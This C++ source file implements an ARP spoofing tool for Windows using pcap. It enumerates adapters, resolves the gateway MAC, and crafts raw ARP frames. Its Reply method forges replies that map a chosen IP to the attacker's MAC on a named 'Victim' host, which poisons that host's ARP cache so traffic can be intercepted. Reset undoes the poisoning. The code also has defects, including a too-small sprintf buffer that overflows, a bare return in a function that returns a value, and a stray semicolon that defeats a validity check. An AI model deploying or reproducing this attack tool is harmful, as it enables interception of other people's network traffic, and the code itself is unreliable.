
#define HAVE_REMOTE

#include<iostream>
#include <string>
#include <vector>
#include <windows.h>

#include <winsock2.h>
#include <ws2def.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <stdio.h>

#include "./regex.h"
#include "./pcap/pcap.h"


#define FORCE_ACCEPT_REPLY 128

#define IPV4(a1,a2,a3,a4) (std::to_string((a1))+"."+std::to_string((a2))+"."+std::to_string((a3))+"."+std::to_string((a4)))

typedef struct EthernetHeader {
	uint8_t dest[6];
	uint8_t src[6];
	uint16_t type;
};


typedef struct ARPHeader 
{
  
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t op;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];

};

typedef struct ARPTrame
{
   EthernetHeader eth;
   ARPHeader arp;
};


struct IPv4Header
{
  uint8_t Version;
  uint8_t TypeOfService;
  uint16_t TotalLength;
  uint16_t Identification;
  uint16_t Flag;
  uint8_t TimeToLive;
  uint8_t Protocol;
  uint16_t HeaderCheckSum;
  uint8_t Src[4];
  uint8_t Dst[4];
};

struct IPv6Header
{
  uint8_t Version;
  uint8_t TrafficClass;
  uint8_t FlowLabel;
  uint16_t PayloadLength;
  uint8_t NextHeader;
  uint8_t HopLimit;
  uint8_t Src[16];
  uint8_t Dst[16];
};


struct TcpHeader
{
  uint16_t SrcPort;
  uint16_t DstPort;
  uint32_t SequenceNumber;
  uint32_t AckNowLedgement;
  uint16_t HeaderLentgh;
  uint16_t Window;
  uint16_t CheckSum;
  uint16_t Urgent;

};

struct UdpHeader
{
  uint16_t SrcPort;
  uint16_t DstPort;
  uint16_t UdpLength;
  uint16_t UdpChecksum;
};



typedef class MAC
{
   public:

    BYTE a1=0;
    BYTE a2=0;
    BYTE a3=0;
    BYTE a4=0;
    BYTE a5=0;
    BYTE a6=0;


    bool IsValid()
    {
       return ((a1+a2+a3+a4+a5+a6)>0) ? true : false;
    }
    

    MAC(BYTE * mac=nullptr)
    {
      assign(mac);
    }
    short Sum()
    {
      return (a1+a2+a3+a4+a5+a6);
    }
    void assign(BYTE * mac=nullptr)
    {
      if(mac==nullptr)
           return;

      a1 = *(BYTE*)(mac+0);
      a2 = *(BYTE*)(mac+1);
      a3 = *(BYTE*)(mac+2);
      a4 = *(BYTE*)(mac+3);
      a5 = *(BYTE*)(mac+4);
      a6 = *(BYTE*)(mac+5);

    }
    std::string tostring()
    {
      char buffer[11];
      sprintf(buffer,"%X:%X:%X:%X:%X:%X",a1,a2,a3,a4,a5,a6);
      return buffer;
    };

    BYTE * toarray()
    {
      return new BYTE[6]{a1,a2,a3,a4,a5,a6};
    } 

     bool compar(BYTE * v)
     {
        return  ((a1==v[0]) && (a2==v[1]) &&  (a3==v[2]) &&  (a4==v[3]) &&  (a5==v[4]) &&  (a6==v[5]));
     }

};

typedef class IPv4
{
   public:

    BYTE a1=0;
    BYTE a2=0;
    BYTE a3=0;
    BYTE a4=0;

    bool IsValid()
    {
      return (bool)((a1+a2+a3+a4)>0);
    }
    
    IPv4(const char * ipv4=nullptr)
    {
      assign(ipv4);
    }
    short Sum()
    {
      return (a1+a2+a3+a4);
    }
    
    IPv4 assign(char * ipv4=nullptr)
    {

      if(ipv4==nullptr)
           return;
      
      std::vector<std::string> byte = Regex.search(ipv4,"\\d+");

      if(byte.size() < 4)
           return *this;
      a1 =  (BYTE)std::stoi(byte[0]);
      a2 =  (BYTE)std::stoi(byte[1]);
      a3 =  (BYTE)std::stoi(byte[2]);
      a4 =  (BYTE)std::stoi(byte[3]);
      return *this;
    }

    ULONG toint()
    {
      return inet_addr(IPV4(a1,a2,a3,a4).c_str());
    }

    std::string tostring()
    {
      return IPV4(a1,a2,a3,a4);
    };
     [[nodiscard]] BYTE * toarray()
     {
      return (new BYTE[4]{a1,a2,a3,a4});
     }

     bool compar(BYTE * v)
     {
        return ((a1==v[0]) && (a2==v[1]) &&  (a3==v[2]) &&  (a4==v[3]));
     }

};



typedef struct _NetowrkInterface_
{
   MAC   Mac;
   IPv4  Ip;
   IPv4  Mask;
   IPv4  Gateway;
   DWORD Index;
   char  AdapterName[272];
   char Description[132];

   bool IsValid()
   {
     return (bool)((Mac.IsValid() && Ip.IsValid() && Mask.IsValid() && Gateway.IsValid()));
   }
   

} NetowrkInterface;




class _NetworkAPI_
{
   public:
    NetowrkInterface DefaultInterface;
    pcap_t * ph;
    char errbuf[PCAP_ERRBUF_SIZE];
   _NetworkAPI_():ARPSpoofing(*this)
   {
       
       std::vector<NetowrkInterface> ni = GetInterfaces();
       for(auto it=ni.begin();it!=ni.end();it++)
       {
           if(it->Gateway.Sum())
              DefaultInterface = *it;
       }

       if(DefaultInterface.IsValid());
       {
         ph=pcap_open(DefaultInterface.AdapterName,65536,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf);
         GatewayMAC = GetMACByIp(DefaultInterface.Gateway);
       }

   };

   struct _ARPSpoofing_
   {
        _NetworkAPI_ & parent;
       _ARPSpoofing_(_NetworkAPI_ & _na): parent(_na){};
       bool Send(const IPv4 VictimIp,const MAC VictimMac);
       bool Reply(const IPv4 VictimIp,const MAC VictimMac,const IPv4 IpReplyUsurpation);
       bool Reset(const IPv4 VictimIp,const MAC VictimMac);
       

   }; 
   
    _ARPSpoofing_ ARPSpoofing;

  std::vector<NetowrkInterface> GetInterfaces();
   MAC GatewayMAC;
  MAC GetMACByIp(const IPv4 ip);

 
      

   
} NetworkAPI;

[[nodiscard]] std::vector<NetowrkInterface> _NetworkAPI_::GetInterfaces()
{
   std::vector<NetowrkInterface> InterfaceData;

   DWORD size = ((ULONG)sizeof(IP_ADAPTER_INFO))*5;

   IP_ADAPTER_INFO * info = (IP_ADAPTER_INFO *)calloc(1,size);
   
   GetAdaptersInfo(info, &size);

   for(;info->Next;info=info->Next)
   {

      InterfaceData.push_back({{info->Address},{info->IpAddressList.IpAddress.String},{info->IpAddressList.IpMask.String},{info->GatewayList.IpAddress.String},info->Index});
      strcpy(InterfaceData[InterfaceData.size()-1].AdapterName,(std::string("\\Device\\NPF_")+info->AdapterName).c_str());
      strcpy(InterfaceData[InterfaceData.size()-1].Description,(info->Description));
   
   }

   return InterfaceData;
};

[[nodiscard]] MAC _NetworkAPI_::GetMACByIp(const IPv4 ip) 
{
    MIB_IPNET_ROW2 row = { {{AF_INET,0,{ip.a1,ip.a2,ip.a3,ip.a4}}} };
    ResolveIpNetEntry2(&row,(new SOCKADDR_INET{{AF_INET,0,{DefaultInterface.Ip.a1,DefaultInterface.Ip.a2,DefaultInterface.Ip.a3,DefaultInterface.Ip.a4}}}));
    return  {std::move(row.PhysicalAddress)};

}

[[nodiscard]] bool _NetworkAPI_::_ARPSpoofing_::Send(const IPv4 VictimIp,const MAC VictimMac)
{
   if(!VictimMac.IsValid())
        return false;

  ARPTrame arppacket;
  memcpy(arppacket.eth.dest,(new BYTE[6]{0xff,0xff,0xff,0xff,0xff,0xff}),6);
  memcpy(arppacket.eth.src,VictimMac.toarray(),6);
  arppacket.eth.type   = htons(0x0806);
  arppacket.arp.htype  = htons(0x0001);
  arppacket.arp.ptype  = htons(0x800);
 
  arppacket.arp.hlen  = 6;
  arppacket.arp.plen  = 4;

  arppacket.arp.op  = htons(1);
  
  memcpy(arppacket.arp.sender_mac,VictimMac.toarray() ,6);
  memcpy(arppacket.arp.sender_ip,parent.DefaultInterface.Ip.toarray(),4);

  memcpy(arppacket.arp.target_mac,(new BYTE[6]{0,0,0,0,0,0}),6);
  memcpy(arppacket.arp.target_ip,NetworkAPI.DefaultInterface.Gateway.toarray(),4);

  if (pcap_sendpacket(parent.ph, (const BYTE*)&arppacket, sizeof(ARPTrame)) != 0)
      return false;
  
  return true;
}

[[nodiscard]] bool _NetworkAPI_::_ARPSpoofing_::Reply(const IPv4 VictimIp,const MAC VictimMac,const IPv4 IpReplyUsurpation)
{

  if(!VictimMac.IsValid())
        return false;

  ARPTrame arppacket;
  memcpy(arppacket.eth.dest,VictimMac.toarray(),6);
  memcpy(arppacket.eth.src,parent.DefaultInterface.Mac.toarray(),6);
   arppacket.eth.type   = htons(0x0806);
   arppacket.arp.htype  = htons(0x0001);
   arppacket.arp.ptype  = htons(0x800);
 
   arppacket.arp.hlen  = 6;
   arppacket.arp.plen  = 4;

   arppacket.arp.op  = htons(2);
  
  memcpy( arppacket.arp.sender_mac,parent.DefaultInterface.Mac.toarray(),6);
  memcpy( arppacket.arp.sender_ip,IpReplyUsurpation.toarray(),4);

  memcpy( arppacket.arp.target_mac,VictimMac.toarray(),6);
  memcpy( arppacket.arp.target_ip,VictimIp.toarray(),4);

  if (pcap_sendpacket(parent.ph, (const BYTE*)&arppacket, sizeof(ARPTrame)) != 0)
      return false;
  
  return true;
}


[[nodiscard]] bool _NetworkAPI_::_ARPSpoofing_::Reset(const IPv4 VictimIp,const MAC VictimMac)
{

  if(!VictimMac.IsValid())
        return false;
   
  

  ARPTrame arppacket;
  memcpy(arppacket.eth.dest,VictimMac.toarray(),6);
  memcpy(arppacket.eth.src,parent.DefaultInterface.Mac.toarray(),6);
   arppacket.eth.type   = htons(0x0806);
   arppacket.arp.htype  = htons(0x0001);
   arppacket.arp.ptype  = htons(0x800);
 
   arppacket.arp.hlen  = 6;
   arppacket.arp.plen  = 4;

   arppacket.arp.op  = htons(2);
  
  memcpy( arppacket.arp.sender_mac, parent.GatewayMAC.toarray(),6);
  memcpy( arppacket.arp.sender_ip,NetworkAPI.DefaultInterface.Gateway.toarray(),4);

  memcpy( arppacket.arp.target_mac,VictimMac.toarray(),6);
  memcpy( arppacket.arp.target_ip,VictimIp.toarray(),4);

  if (pcap_sendpacket(parent.ph, (const BYTE*)&arppacket, sizeof(ARPTrame)) != 0)
      return false;
  
  return true;
}

